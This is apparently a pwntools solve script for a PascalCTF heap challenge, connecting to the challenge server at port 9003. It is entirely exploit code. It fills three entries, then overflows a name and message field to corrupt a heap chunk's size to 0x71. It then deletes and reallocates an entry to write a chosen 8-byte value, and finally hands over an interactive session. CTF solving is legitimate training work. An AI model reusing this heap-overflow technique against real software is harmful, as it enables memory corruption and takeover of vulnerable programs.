from pwn import *

#p=process('./average')
p=remote('ahc.ctf.pascalctf.it','9003')
#gdb.attach(p)
#pause()

def create(idx):
    p.recvuntil(">")
    p.sendline(b"1")
    p.recvuntil("at:")
    p.sendline(str(idx))
    p.recvuntil("?")
    p.sendline(b"0")
    p.recvuntil("name:")
    p.sendline(b"A")
    p.recvuntil("message:")
    p.sendline(b"A")


create(0)
create(1)
create(2)

p.recvuntil(">")
p.sendline(b"1")
p.recvuntil("at:")
p.sendline(b"3")
p.recvuntil("?")
p.sendline(b"0")
p.recvuntil("name:")
p.sendline(b"A"*39)
p.recvuntil("message:")
payload = b"A"*32
payload+= b"q" #equivalent of 0x71
p.sendline(payload)

create(4)
#DEL

p.recvuntil(">")
p.sendline("2")
p.recvuntil("from:")
p.sendline(b"4")

p.recvuntil(">")
p.sendline(b"1")
p.recvuntil("at:")
p.sendline(b"4")
p.recvuntil("?")
p.sendline(b"20")
p.recvuntil("name:")
p.sendline(b"A"*55)
p.recvuntil("message:")
payload = b"A"*24
payload+= p64(0xDEADBEEFCAFEBABE)
p.sendline(payload)

p.interactive()